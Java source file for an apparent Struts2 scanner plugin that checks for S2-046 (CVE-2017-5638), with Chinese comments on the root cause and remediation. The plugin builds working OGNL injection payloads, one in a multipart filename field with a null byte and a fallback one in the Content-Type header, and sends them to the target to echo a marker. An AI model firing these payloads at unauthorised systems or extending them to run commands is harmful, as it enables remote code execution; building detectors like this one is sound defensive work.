package com.s2tool.plugins.impl;

import com.s2tool.core.HttpClient;
import com.s2tool.core.HttpResponseData;
import com.s2tool.core.PayloadBuilder;
import com.s2tool.core.ResultParser;
import com.s2tool.core.Target;
import com.s2tool.plugins.DetectionResult;
import com.s2tool.plugins.PluginContext;
import com.s2tool.plugins.VulPlugin;
import com.s2tool.plugins.VulnInfo;

import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

/**
 * S2-046 漏洞检测插件（CVE-2017-5638 同族变种）。
 *
 * <p>漏洞原理：与 S2-045 同源于 Jakarta Multipart 解析器，<b>触发点相同</b>
 * （解析异常消息被 Struts2 国际化文本流程 OGNL 求值），但触发异常的方式不同：
 * <ul>
 *   <li>S2-045：Content-Type 头值非法（含 OGNL 且非合法 multipart 格式）</li>
 *   <li>S2-046：Content-Disposition 的 filename 字段含空字节（\x00）或
 *       Content-Length 超过上限 + jakarta-stream 解析器</li>
 * </ul>
 *
 * <p>检测策略（三重）：
 * <ol>
 *   <li><b>filename 空字节注入</b>（S2-046 标准变体）：构造合法 multipart 请求体，
 *       filename 字段承载 OGNL 指纹标记 + 空字节截断。注意：commons-fileupload
 *       1.3.3/1.4+ 才会对空字节抛 InvalidFileNameException，1.3.2 及以下不触发</li>
 *   <li><b>Content-Type 注入兜底</b>（同根因验证）：由于 S2-045/S2-046 触发点相同，
 *       若 Content-Type 注入可执行 OGNL，则说明 Jakarta 异常消息求值链路存在，
 *       同 CVE 的 S2-046 受影响版本同样可被利用</li>
 * </ol></p>
 */
public class S2_046 implements VulPlugin {

    private static final VulnInfo INFO = new VulnInfo(
            "S2-046",
            "CVE-2017-5638",
            "Struts2 Jakarta Multipart Parser OGNL Injection (filename)",
            "Jakarta Multipart 解析器在处理 Content-Disposition 头 filename 字段（含空字节）"
                    + "或超大 Content-Length 时抛出异常，异常消息拼接用户可控内容并经过 OGNL 求值，"
                    + "导致任意代码执行。与 S2-045 同一 CVE、同一触发点，利用方式不同。",
            "2.3.5 - 2.3.31, 2.5 - 2.5.10.1",
            "header",
            new String[]{"math", "marker"},
            "high",
            "升级至 Struts2 2.3.32 或 2.5.10.1 以上版本；或改用非 Jakarta 的 multipart 解析器；"
                    + "升级 commons-fileupload 至 1.3.3+"
    );

    private static final String BOUNDARY = "----WebKitFormBoundaryS2046";

    @Override
    public VulnInfo getInfo() {
        return INFO;
    }

    @Override
    public DetectionResult check(Target target, PluginContext ctx) {
        HttpClient http = ctx.getHttpClient();
        DetectionResult result = new DetectionResult(INFO.getVulnId());
        result.setRequestPreview("POST " + target.getFullUrl() + "  [multipart filename 空字节注入]");

        // 1) filename 空字节注入（S2-046 标准变体）
        boolean filenameHit = checkFilenameNullByte(http, target, ctx, result);

        // 2) Content-Type 注入兜底（与 S2-045 同根因，同一 CVE）
        boolean contentTypeHit = false;
        if (!filenameHit) {
            contentTypeHit = checkContentTypeFallback(http, target, ctx, result);
        }

        if (filenameHit || contentTypeHit) {
            result.setStatus(DetectionResult.Status.CONFIRMED);
            result.setConfidence(DetectionResult.Confidence.HIGH);
            result.setDetail("Jakarta 解析器 OGNL 执行确认（filename 空字节注入=" + filenameHit
                    + ", Content-Type 同根因=" + contentTypeHit + "）");
        } else {
            result.setStatus(DetectionResult.Status.NOT_FOUND);
            result.setDetail("所有检测策略均未命中（filename 空字节注入需 commons-fileupload 1.3.3+）");
        }
        return result;
    }

    /** filename 空字节注入：OGNL 指纹标记 + \x00 截断 */
    private boolean checkFilenameNullByte(HttpClient http, Target target, PluginContext ctx,
                                          DetectionResult result) {
        try {
            String uuid = PayloadBuilder.randomUuid();
            String ognl = "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                    + "(#o.println('" + uuid + "')).(#o.close())";
            byte[] body = buildMultipartBodyWithNull(ognl);
            HttpResponseData resp = sendMultipart(http, target, ctx, body);
            result.setElapsedMs(resp.getElapsedMs());
            result.setRawResponse(resp);
            result.setResponsePreview(truncate(resp.getBody(), 1000));
            if (resp.isConnected() && ResultParser.containsAnywhere(resp, uuid)) {
                result.addTechnique("marker");
                result.setDetail("指纹标记命中：filename 空字节注入，UUID 回显成功");
                return true;
            }
            // 数学验证（参考公开 POC 算术运算）
            String expected = PayloadBuilder.MATH_RESULT;
            String mathOgnl = "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                    + "(#o.println(" + PayloadBuilder.MATH_EXPR + ")).(#o.close())";
            byte[] mathBody = buildMultipartBodyWithNull(mathOgnl);
            HttpResponseData mathResp = sendMultipart(http, target, ctx, mathBody);
            if (mathResp.isConnected() && ResultParser.contains(mathResp.getBody(), expected)) {
                result.addTechnique("math");
                result.setDetail("数学运算验证命中：filename 空字节注入，算式结果回显");
                return true;
            }
        } catch (Exception e) {
            // ignore
        }
        return false;
    }

    /**
     * 构造 multipart 请求体：filename 字段承载 OGNL 表达式 + \x00 空字节。
     * 空字节放在表达式闭合引号之后，使 Jakarta 解析器在部分版本抛 InvalidFileNameException。
     */
    private byte[] buildMultipartBodyWithNull(String ognlBody) {
        StringBuilder sb = new StringBuilder();
        sb.append("--").append(BOUNDARY).append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"upload\"; filename=\"")
          .append("%{(").append(ognlBody).append(")}\"\u0000\r\n");
        sb.append("Content-Type: text/plain\r\n\r\n");
        sb.append("s2046-test\r\n");
        sb.append("--").append(BOUNDARY).append("--\r\n");
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }

    /** Content-Type 注入兜底：与 S2-045 完全相同的触发链路 */
    private boolean checkContentTypeFallback(HttpClient http, Target target, PluginContext ctx,
                                             DetectionResult result) {
        try {
            String uuid = PayloadBuilder.randomUuid();
            String contentType = PayloadBuilder.markerPayload(uuid);
            Map<String, String> extra = new HashMap<>();
            if (ctx.getExtraHeaders() != null) extra.putAll(ctx.getExtraHeaders());
            HttpResponseData resp = http.post(target.getFullUrl(), contentType,
                    target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass(),
                    null, extra);
            if (resp.isConnected() && ResultParser.containsAnywhere(resp, uuid)) {
                result.addTechnique("marker");
                result.setDetail("Content-Type 注入命中（与 S2-045 同根因，同 CVE-2017-5638）");
                return true;
            }
        } catch (Exception e) {
            // ignore
        }
        return false;
    }

    private HttpResponseData sendMultipart(HttpClient http, Target target, PluginContext ctx,
                                           byte[] body) {
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
        if (ctx.getExtraHeaders() != null) headers.putAll(ctx.getExtraHeaders());
        return http.request("POST", target.getFullUrl(), headers, body,
                target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass());
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max);
    }
}
